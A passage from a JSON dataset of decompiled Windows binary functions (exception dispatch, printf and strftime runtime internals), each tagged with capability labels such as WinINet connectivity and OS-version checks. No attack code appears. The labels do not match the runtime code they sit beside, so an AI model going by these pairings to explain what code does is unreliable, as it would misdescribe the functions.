        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00454845(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *unaff_ESI;\n    uint32_t *puVar7;\n    uint var_44h;\n    uint32_t *var_38h;\n    int32_t *var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t *var_20h;\n    int32_t *var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    iVar6 = 0;\n    var_28h = var_28h & 0xffffff00;\n    var_1h._0_1_ = '\\0';\n    if (arg_18h[1] < 0x81) {\n        var_8h = *(arg_ch + 8);\n    }\n    else {\n        var_8h = *(arg_ch + 8);\n    }\n    puVar7 = arg_18h;\n    if ((var_8h < -1) || (arg_18h[1] <= var_8h)) goto code_r0x00454b79;\n    unaff_ESI = arg_8h;\n    if (*arg_8h == -0x1f928c9d) {\n        if ((arg_8h[4] != 3) ||\n           ((((arg_8h[5] != 0x19930520 && (arg_8h[5] != 0x19930521)) && (arg_8h[5] != 0x19930522)) || (arg_8h[7] != 0)))\n           ) {\n            var_ch = arg_10h;\ncode_r0x00454999:\n            arg_10h = var_ch;\n            if (((*unaff_ESI != -0x1f928c9d) || (unaff_ESI[4] != 3)) ||\n               ((unaff_ESI[5] != 0x19930520 && ((unaff_ESI[5] != 0x19930521 && (unaff_ESI[5] != 0x19930522))))))\n            goto code_r0x00454b26;\n            if ((arg_18h[3] != 0) &&\n               (iVar6 = fcn.00450e57(arg_18h, arg_20h, var_8h, &var_14h, &var_2ch),  var_14h < var_2ch)) {\n                var_20h = iVar6 + 0x10;\n                uVar5 = var_8h;\n                do {\n                    var_38h = var_20h + -4;\n                    if ((var_20h[-4] == uVar5 || var_20h[-4] < uVar5) && (uVar5 <= var_20h[-3])) {\n                        var_10h = *var_20h;\n                        var_18h = var_20h[-1];\n                        if (0 < var_18h) {\n                            var_30h = **(unaff_ESI[7] + 0xc);\n                            var_34h = *(unaff_ESI[7] + 0xc) + 1;\n                            piVar2 = var_34h;\n                            iVar6 = var_30h;\n                            do {\n                                while (var_24h = iVar6,  var_1ch = piVar2,  0 < var_24h) {\n                                    iVar6 = fcn.0045510a(var_10h, *var_1ch, unaff_ESI[7]);\n                                    if (iVar6 != 0) {\n                                        var_1h._0_1_ = '\\x01';\n                                        fcn.00454782(unaff_ESI, arg_ch, var_ch, arg_14h, arg_18h, var_10h, *var_1ch, \n                                                     var_38h, arg_20h, arg_24h);\n                                        uVar5 = var_8h;\n                                        goto code_r0x00454ac1;\n                                    }\n                                    piVar2 = var_1ch + 1;\n                                    iVar6 = var_24h + -1;\n                                }\n                                var_10h = var_10h + 0x10;\n                                var_18h = var_18h - 1;\n                                uVar5 = var_8h;\n                                piVar2 = var_34h;\n                                iVar6 = var_30h;\n                            } while (0 < var_18h);\n                        }\n                    }\ncode_r0x00454ac1:\n                    var_14h = var_14h + 1;\n                    var_20h = var_20h + 5;\n                } while (var_14h < var_2ch);\n            }\n            if (arg_1ch != '\\0') {\n                fcn.00451170(unaff_ESI);\n            }\n            if (((var_1h == '\\0') && (0x19930520 < (*arg_18h & 0x1fffffff))) &&\n               ((arg_18h[7] != 0 || (((*(arg_18h + 8) & 4) != 0 && (arg_20h == 0)))))) {\n                puVar7 = arg_18h;\n                if ((*(arg_18h + 8) & 4) != 0) goto code_r0x00454b79;\n                cVar3 = fcn.00454ce1(unaff_ESI, arg_18h[7]);\n                if (cVar3 == '\\0') goto code_r0x00454b7e;\n            }\n            goto code_r0x00454b48;\n        }\n        iVar4 = fcn.004543fc();\n        if (*(iVar4 + 0x10) == 0) {\n            return;\n        }\n        iVar4 = fcn.004543fc();\n        unaff_ESI = *(iVar4 + 0x10);\n        iVar4 = fcn.004543fc();\n        var_28h = CONCAT31(var_28h._1_3_, 1);\n        var_ch = *(iVar4 + 0x14);\n        if ((unaff_ESI != NULL) &&\n           ((((*unaff_ESI != -0x1f928c9d || (unaff_ESI[4] != 3)) ||\n             ((unaff_ESI[5] != 0x19930520 && ((unaff_ESI[5] != 0x19930521 && (unaff_ESI[5] != 0x19930522)))))) ||\n            (unaff_ESI[7] != 0)))) {\n            iVar4 = fcn.004543fc();\n            if (*(iVar4 + 0x1c) != 0) {\n                iVar4 = fcn.004543fc();\n                var_20h = *(iVar4 + 0x1c);\n                iVar4 = fcn.004543fc();\n                *(iVar4 + 0x1c) = 0;\n                cVar3 = fcn.00454ce1(unaff_ESI, var_20h);\n                puVar7 = var_20h;\n                if (cVar3 == '\\0') {\n                    if (0 < *var_20h) {\n                        var_20h = NULL;\n                        do {\n                            cVar3 = fcn.0040c870(0x491b88);\n                            if (cVar3 != '\\0') {\n                                fcn.00451170(unaff_ESI);\n                                fcn.00425e9a();\n                                fcn.00451487(&var_44h, 0x48cbac);\n                                break;\n                            }\n                            iVar6 = iVar6 + 1;\n                            var_20h = var_20h + 4;\n                        } while (iVar6 < *puVar7);\n                    }\n                    goto code_r0x00454b79;\n                }\n            }\n            goto code_r0x00454999;\n        }\n    }\n    else {\ncode_r0x00454b26:\n        if (arg_18h[3] != 0) {\n            puVar7 = arg_18h;\n            if (arg_1ch != '\\0') goto code_r0x00454b79;\n            fcn.00454bc6(unaff_ESI, arg_ch, arg_10h, arg_14h, arg_18h, var_8h, arg_20h, arg_24h);\n        }\ncode_r0x00454b48:\n        iVar6 = fcn.004543fc();\n        puVar7 = arg_18h;\n        if (*(iVar6 + 0x1c) == 0) {\n            return;\n        }\n    }\ncode_r0x00454b79:\n    fcn.004567ea();\n    arg_18h = puVar7;\ncode_r0x00454b7e:\n    fcn.004543fc();\n    fcn.004543fc();\n    iVar6 = fcn.004543fc();\n    *(iVar6 + 0x10) = unaff_ESI;\n    iVar6 = fcn.004543fc();\n    *(iVar6 + 0x14) = var_ch;\n    if (arg_24h == 0) {\n        arg_24h = arg_ch;\n    }\n    fcn.00450f01(arg_24h, unaff_ESI);\n    fcn.00454f40(arg_ch, arg_14h, arg_18h, 0xffffffff);\n    fcn.00454748(arg_18h[7]);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 2288
    },
    "00454f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00454f40(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0043b410(0x48ef28, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar5 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar5 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.004543fc();\n    *(iVar4 + 0x18) = *(iVar4 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (iVar4 = *(unaff_EBP + 0x10),  *(iVar4 + 4) <= iVar5)) goto code_r0x00455007;\n        iVar1 = *(iVar4 + 8);\n        uVar2 = *(iVar1 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar5 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.00454540(*(*(iVar4 + 8) + 4 + iVar5 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar5 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00454ff3();\n    if (iVar5 == *(unaff_EBP + 0x14)) {\n        *(*(unaff_EBP + 8) + 8) = iVar5;\n        fcn.0043b456();\n        return;\n    }\ncode_r0x00455007:\n    fcn.004567ea();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 633
    },
    "00454ff3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454ff3(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004543fc();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.004543fc();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00456c19": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00456c19(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    float var_4h;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.0045652e();\n        *puVar1 = 0x16;\n        fcn.004559dd();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004562ff(arg_10h);\n        puVar1 = &var_4h;\n        var_4h = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.00455a7a(&stack0xffffffcc, arg_8h, arg_ch);\n        iVar2 = fcn.00456dc1(&var_14h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.0045652e();\n            *puVar1 = 0x22;\n        }\n        if (var_ch != '\\0') {\n            *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n        }\n        fVar3 = var_4h;\n    }\n    return fVar3;\n}\n",
        "token_count": 414
    },
    "00456caa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00456caa(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    float10 fVar3;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == 0) {\n        puVar1 = fcn.0045652e();\n        *puVar1 = 0x16;\n        fcn.004559dd();\n        fVar3 = 0;\n    }\n    else {\n        fcn.004562ff(arg_10h);\n        puVar1 = &var_ch;\n        _var_ch = 0.0;\n        arg_ch_00 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.00455a7a(&stack0xffffffc8, arg_8h, arg_ch);\n        iVar2 = fcn.00456e37(&var_18h, arg_ch_00, arg_10h_00, puVar1);\n        if ((iVar2 == 3) || (iVar2 == 2)) {\n            puVar1 = fcn.0045652e();\n            *puVar1 = 0x22;\n        }\n        fVar3 = _var_ch;\n        if (var_10h != '\\0') {\n            *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        }\n    }\n    return fVar3;\n}\n",
        "token_count": 412
    },
    "0045ac6b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0045ac6b(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    char cVar3;\n    uchar uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint arg_8h;\n    uint arg_ch;\n    uint uStack8;\n    \n    cVar3 = *(param_1 + 0x31);\n    if (cVar3 != 'F') {\n        if (cVar3 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar3 < 'k') {\n                if (cVar3 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar3 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar3 = *pcVar1;\n                    if ((cVar3 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar3 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar3 != 'd') && (cVar3 != 'i')) && (cVar3 != 'o')) && ((cVar3 != 'u' && (cVar3 != 'x'))))\n                       && (cVar3 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar3 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar3 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar3 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar6 = 1;\n                }\n                else {\n                    uVar6 = 2;\n                }\n            }\n            else {\n                if (cVar3 != 'l') {\n                    if (cVar3 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar3 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar3 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar6 = 4;\n                }\n                else {\n                    uVar6 = 3;\n                }\n            }\n            param_1[0xb] = uVar6;\n            return 1;\n        }\n        puVar5 = fcn.0045652e();\n        *puVar5 = 0x16;\n        fcn.004559dd();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    iVar7 = 1;\n    cVar3 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar3 < 'e') {\n        if (cVar3 == 'd') {\ncode_r0x0045ae79:\n            param_1[8] = param_1[8] | 0x10;\n            goto code_r0x0045ae7d;\n        }\n        if ('X' < cVar3) {\n            if (cVar3 == 'Z') {\n                cVar3 = fcn.0045b075();\n                goto code_r0x0045ae15;\n            }\n            if (cVar3 != 'a') {\n                if (cVar3 != 'c') {\n                    return 0;\n                }\ncode_r0x0045ae39:\n                cVar3 = fcn.0045b22f(0);\n                goto code_r0x0045ae15;\n            }\ncode_r0x0045ae89:\n            cVar3 = fcn.0045b0d6();\n            goto code_r0x0045ae15;\n        }\n        if (cVar3 != 'X') {\n            if (cVar3 != 'A') {\n                if (cVar3 == 'C') goto code_r0x0045ae39;\n                if (cVar3 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar3) {\n                    if (cVar3 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0045ae0e;\n                }\n            }\n            goto code_r0x0045ae89;\n        }\n        arg_ch = 1;\ncode_r0x0045ae25:\n        arg_8h = 0x10;\n    }\n    else {\n        if (cVar3 < 'q') {\n            if (cVar3 == 'p') {\n                cVar3 = fcn.0045b4a5();\n                goto code_r0x0045ae15;\n            }\n            if (cVar3 < 'h') goto code_r0x0045ae89;\n            if (cVar3 != 'i') {\n                if (cVar3 == 'n') {\n                    cVar3 = fcn.0045b412();\n                }\n                else {\n                    if (cVar3 != 'o') {\n                        return 0;\n                    }\n                    cVar3 = fcn.0045b486();\n                }\n                goto code_r0x0045ae15;\n            }\n            goto code_r0x0045ae79;\n        }\n        if (cVar3 == 's') {\ncode_r0x0045ae0e:\n            cVar3 = fcn.0045b4bd();\n            goto code_r0x0045ae15;\n        }\n        if (cVar3 != 'u') {\n            if (cVar3 != 'x') {\n                return 0;\n            }\n            arg_ch = 0;\n            goto code_r0x0045ae25;\n        }\ncode_r0x0045ae7d:\n        arg_ch = 0;\n        arg_8h = 10;\n    }\n    cVar3 = fcn.0045b2bf(arg_8h, arg_ch);\ncode_r0x0045ae15:\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    uVar6 = param_1[8];\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    iVar8 = 0;\n    if ((uVar6 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        iVar8 = iVar7;\n        if ((uVar6 >> 6 & 1) == 0) {\n            if ((uVar6 & 1) == 0) {\n                iVar8 = 0;\n                if ((uVar6 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    iVar8 = iVar7;\n                }\n            }\n            else {\n                uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n            }\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n    }\n    cVar3 = *(param_1 + 0x31);\n    if (((cVar3 != 'x') && (cVar3 != 'X')) || ((uVar6 >> 5 & 1) == 0)) {\n        iVar7 = 0;\n    }\n    if ((cVar3 == 'a') || (cVar3 == 'A')) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((iVar7 != '\\0') || (bVar2)) {\n        *(&uStack8 + iVar8) = 0x30;\n        if ((cVar3 == 'X') || (cVar3 == 'A')) {\n            uVar4 = 0x58;\n        }\n        else {\n            uVar4 = 0x78;\n        }\n        *(&uStack8 + iVar8 + 1) = uVar4;\n        iVar8 = iVar8 + 2;\n    }\n    arg_14h = param_1 + 6;\n    iVar7 = (param_1[9] - param_1[0xe]) - iVar8;\n    if ((uVar6 & 0xc) == 0) {\n        fcn.0045a7dd(param_1 + 0x112, 0x20, iVar7, arg_14h);\n    }\n    fcn.0045b63b(&uStack8, iVar8, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.0045a7dd(param_1 + 0x112, 0x30, iVar7, arg_14h);\n    }\n    fcn.0045b592(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.0045a7dd(param_1 + 0x112, 0x20, iVar7, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2338
    },
    "0045c788": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0045c788(uint arg_8h, uint arg_ch, uint32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t in_ECX;\n    char32_t *pcVar6;\n    bool bVar7;\n    bool bVar8;\n    uint uVar9;\n    uint32_t uVar10;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch;\n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (0x5a < uVar3) {\n        while (uVar3 < 0x6f) {\n            if (uVar3 == 0x6e) {\n                pcVar6 = str.__n:_t_ + 1;\n                goto code_r0x0045ca22;\n            }\n            if (uVar3 < 0x66) {\n                if (uVar3 == 0x65) {\n                    uVar3 = arg_10h[3];\n                    if (0x1e < uVar3 - 1) goto code_r0x0045ca3a;\n                    uVar10 = (arg_20h ^ 1) << 5;\n                    goto code_r0x0045ca82;\n                }\n                if (uVar3 == 0x61) {\n                    if (6 < arg_10h[6]) goto code_r0x0045ca3a;\n                    pcVar6 = *(arg_1ch + 0xb4 + arg_10h[6] * 4);\n                    goto code_r0x0045ca22;\n                }\n                if (uVar3 == 0x62) {\n                    if (0xb < arg_10h[4]) goto code_r0x0045ca3a;\n                    pcVar6 = *(arg_1ch + 0xec + arg_10h[4] * 4);\n                    goto code_r0x0045ca22;\n                }\n                if (uVar3 != 99) {\n                    if (uVar3 != 100) {\n                        return 0;\n                    }\n                    uVar3 = arg_10h[3];\n                    if (0x1e < uVar3 - 1) goto code_r0x0045ca3a;\n                    goto code_r0x0045c8b1;\n                }\n                if ((arg_1ch != 0x47afe8) || (arg_20h != 0)) {\n                    cVar2 = fcn.0045d2d3(arg_8h, arg_20h & 0xff, arg_10h, arg_14h, arg_18h, arg_1ch);\n                    if (cVar2 == '\\0') goto code_r0x0045c908;\n                    fcn.0045d2a2(str.__n:_t_, arg_14h, arg_18h);\n                    cVar2 = fcn.0045d2d3(arg_8h, 2, arg_10h, arg_14h, arg_18h, arg_1ch);\n                    goto code_r0x0045c9b0;\n                }\n                cVar2 = fcn.0045c788(arg_8h, 0x61, arg_10h, arg_14h, arg_18h, 0x47afe8, 0);\n                if (cVar2 == '\\0') goto code_r0x0045c908;\n                fcn.0045d2a2(str.__n:_t_, arg_14h, arg_18h);\n                cVar2 = fcn.0045c788(arg_8h, 0x62, arg_10h, arg_14h, arg_18h, 0x47afe8, 0);\n                if (cVar2 == '\\0') goto code_r0x0045c908;\n                fcn.0045d2a2(str.__n:_t_, arg_14h, arg_18h);\n                cVar2 = fcn.0045c788(arg_8h, 0x65, arg_10h, arg_14h, arg_18h, 0x47afe8, 0);\n                if (cVar2 == '\\0') goto code_r0x0045c908;\n                fcn.0045d2a2(str.__n:_t_, arg_14h, arg_18h);\n                cVar2 = fcn.0045c788(arg_8h, 0x54, arg_10h, arg_14h, arg_18h, 0x47afe8, 0);\n                if (cVar2 == '\\0') goto code_r0x0045c908;\n                fcn.0045d2a2(str.__n:_t_, arg_14h, arg_18h);\n                arg_20h = 0;\n                uVar9 = 0x59;\n                goto code_r0x0045c9a5;\n            }\n            if (uVar3 == 0x67) {\n                if (9999 < arg_10h[5] + 0x76c) goto code_r0x0045ca3a;\n                uVar10 = 0x30;\n                uVar9 = 2;\n                iVar4 = fcn.0045c75d(arg_10h[5], arg_10h[6], arg_10h[7]);\n                uVar3 = iVar4 + 0x76c;\n                goto code_r0x0045c870;\n            }\n            if (uVar3 != 0x68) {\n                if (uVar3 == 0x6a) {\n                    uVar3 = arg_10h[7];\n                    if (0x16d < uVar3) goto code_r0x0045ca3a;\n                    uVar9 = 3;\n                }\n                else {\n                    if (uVar3 != 0x6d) {\n                        return 0;\n                    }\n                    uVar3 = arg_10h[4];\n                    if (0xb < uVar3) goto code_r0x0045ca3a;\n                    uVar9 = 2;\n                }\n                uVar10 = (arg_20h != 0) - 1U & 0x30;\n                uVar3 = uVar3 + 1;\n                goto code_r0x0045c803;\n            }\n            arg_ch._0_2_ = 0x62;\n            uVar3 = 0x62;\n        }\n        if (uVar3 < 0x78) {\n            if (uVar3 != 0x77) {\n                if (uVar3 == 0x70) {\n                    if (0x17 < arg_10h[2]) goto code_r0x0045ca3a;\n                    if (arg_10h[2] < 0xc) {\n                        pcVar6 = *(arg_1ch + 0x14c);\n                    }\n                    else {\n                        pcVar6 = *(arg_1ch + 0x150);\n                    }\ncode_r0x0045ca22:\n                    fcn.0045d2a2(pcVar6, arg_14h, arg_18h);\n                    return 1;\n                }\n                if (uVar3 == 0x72) {\n                    if (arg_1ch == 0x47afe8) {\n                        cVar2 = fcn.0045c788(arg_8h, 0x49, arg_10h, arg_14h, arg_18h, 0x47afe8, arg_20h);\n                        if (cVar2 == '\\0') goto code_r0x0045c908;\n                        fcn.0045d2a2(str.__n:_t_ + 2, arg_14h, arg_18h);\n                        cVar2 = fcn.0045c788(arg_8h, 0x4d, arg_10h, arg_14h, arg_18h, 0x47afe8, arg_20h);\n                        if (cVar2 == '\\0') goto code_r0x0045c908;\n                        fcn.0045d2a2(str.__n:_t_ + 2, arg_14h, arg_18h);\n                        cVar2 = fcn.0045c788(arg_8h, 0x53, arg_10h, arg_14h, arg_18h, 0x47afe8, arg_20h);\n                        if (cVar2 == '\\0') goto code_r0x0045c908;\n                        fcn.0045d2a2(str.__n:_t_, arg_14h, arg_18h);\n                        uVar9 = 0x70;\n                        goto code_r0x0045c9a5;\n                    }\n                    cVar2 = fcn.0045c788(arg_8h, 0x58, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                    goto code_r0x0045c9b0;\n                }\n                if (uVar3 == 0x74) {\n                    pcVar6 = str.__n:_t_ + 3;\n                    goto code_r0x0045ca22;\n                }\n                if (uVar3 != 0x75) {\n                    return 0;\n                }\n            }\n            uVar3 = arg_10h[6];\n            if (uVar3 < 7) {\n                if ((uVar3 == 0) && (arg_ch == 0x75)) {\n                    uVar3 = 7;\n                }\n                uVar10 = (arg_20h != 0) - 1U & 0x30;\n                uVar9 = 1;\n                goto code_r0x0045c803;\n            }\n            goto code_r0x0045ca3a;\n        }\n        if (uVar3 != 0x78) {\n            if (uVar3 == 0x79) {\n                uVar3 = arg_10h[5] + 0x76c;\n                if (uVar3 < 10000) {\n                    uVar10 = (arg_20h != 0) - 1U & 0x30;\n                    uVar9 = 2;\ncode_r0x0045c870:\n                    uVar3 = uVar3 % 100;\n                    goto code_r0x0045c803;\n                }\n            }\n            else {\n                if (uVar3 != 0x7a) {\n                    return 0;\n                }\n                fcn.00466762();\n                var_4h = 0;\n                iVar4 = fcn.0046631c(&fcn.0045c788::var_4h);\n                if (iVar4 == 0) {\n                    if (arg_10h[8] != 0) {\n                        var_8h = 0;\n                        iVar4 = fcn.004662f0(&fcn.0045c788::var_8h);\n                        if (iVar4 != 0) goto code_r0x0045ca3a;\n                        var_4h = var_4h + var_8h;\n                    }\n                    iVar4 = ((var_4h ^ var_4h >> 0x1f) - (var_4h >> 0x1f)) / 0x3c;\n                    pcVar6 = str.__n:_t_ + 4;\n                    if (-1 < var_4h) {\n                        pcVar6 = 0x475b0c;\n                    }\n                    fcn.0045d2a2(pcVar6, arg_14h, arg_18h);\n                    fcn.0045d1a0(iVar4 / 0x3c, 2, arg_14h, arg_18h, 0x30);\n                    fcn.0045d1a0(iVar4 % 0x3c, 2, arg_14h, arg_18h, 0x30);\n                    return 1;\n                }\n            }\n            goto code_r0x0045ca3a;\n        }\n        arg_20h = arg_20h & 0xff;\ncode_r0x0045ccf4:\n        cVar2 = fcn.0045d2d3(arg_8h, arg_20h, arg_10h, arg_14h, arg_18h, arg_1ch);\n        goto code_r0x0045c9b0;\n    }\n    if (uVar3 == 0x5a) {\n        fcn.00466762();\n        var_8h = 0;\n        iVar4 = fcn.004662be();\n        iVar4 = fcn.004628eb(&fcn.0045c788::var_8h, *arg_14h, *arg_18h, *(iVar4 + (-(arg_10h[8] != 0) & 4)), 0xffffffff\n                             , arg_8h);\n        if ((iVar4 != 0) && ((iVar4 == 0x16 || (iVar4 == 0x22)))) {\n            uVar9 = fcn.00455a0a(0, 0, 0, 0, 0);\n            return uVar9;\n        }\n        if (iVar4 == 0x50) {\n            *arg_14h = *arg_14h + *arg_18h * 2;\n            *arg_18h = 0;\n            return 1;\n        }\n        *arg_18h = *arg_18h + (1 - var_8h);\n        *arg_14h = *arg_14h + var_8h * 2 + -2;\n        return 1;\n    }\n    if (uVar3 < 0x4e) {\n        if (uVar3 == 0x4d) {\n            uVar3 = arg_10h[1];\n            bVar7 = uVar3 < 0x3b;\n            bVar8 = uVar3 == 0x3b;\n            goto code_r0x0045ce96;\n        }\n        if (uVar3 < 0x45) {\n            if (uVar3 != 0x44) {\n                if (uVar3 == 0x25) {\n                    pcVar6 = str.__n:_t_ + 5;\n                    goto code_r0x0045ca22;\n                }\n                if (uVar3 == 0x41) {\n                    if (arg_10h[6] < 7) {\n                        